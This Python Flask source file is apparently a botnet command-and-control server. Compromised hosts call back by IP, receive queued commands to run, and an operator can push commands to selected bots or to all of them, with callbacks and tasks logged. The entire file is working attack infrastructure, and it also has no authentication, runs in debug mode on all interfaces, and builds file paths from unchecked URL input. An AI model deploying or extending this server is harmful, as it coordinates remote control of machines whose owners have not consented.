"""
Process POST/GET requests from clients/commander, distribute commands and keep track of bot callbacks
@author: degenerat3
"""

from flask import Flask, request
import datetime
import os



app = Flask(__name__)

all_hosts = set()


@app.route('/<ip>/<typ>')
@app.route('/api/callback/<ip>/<typ>')
def process_callbacks(ip, typ):
    global all_hosts
    all_hosts.add(ip)
    src = typ
    call_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if os.path.isfile("/tmp/cc/calls.log"):
        with open("/tmp/cc/calls.log", 'a') as f:
            s = "{0:<25} {1:<16} {2:<10}\n".format(call_time, ip, src)
            f.write(s)
    else:
        with open("/tmp/cc/calls.log", 'w') as f:
            s = "{0:<25} {1:<16} {2:<10}\n".format(call_time, ip, src)
            f.write(s)
    com_file = "/tmp/cc/hosts/" + ip
    if os.path.isfile(com_file):
        with open(com_file, 'r') as f:
            c = f.read()
            os.remove(com_file)
            return c + "\n"
    else:
        return "#lmao\n" 


def log_action(hosts, cmds):
    action_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_str = action_time + " : " + str(hosts) + " : " + cmds + "\n"
    with open("/tmp/cc/tasks.log", 'a') as f:
        f.write(log_str)


@app.route('/api/commander/push', methods=['POST'])
def proc_inc_coms():
    content = request.json 
    host_str = content['hosts']
    coms = content['commands']
    if host_str.strip() == "all":    
        hosts = list(all_hosts)
    else:
        hosts = host_str.split('|')

    log_action(hosts, coms)
    for h in hosts:
        com_file = "/tmp/cc/hosts/" + h
        if os.path.isfile(com_file):
            with open(com_file, 'a') as f:
                f.write(coms)
        else:
            with open(com_file, 'w') as f:
                f.write(coms)
    return ""


@app.route('/api/commander/calls')
def show_call_log():
    with open("/tmp/cc/calls.log", 'r') as f:
        s = f.read()
        return s

@app.route('/api/commander/tasks')
def show_action_log():
    with open("/tmp/cc/tasks.log", 'r') as f:
        s = f.read()
        return s


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')


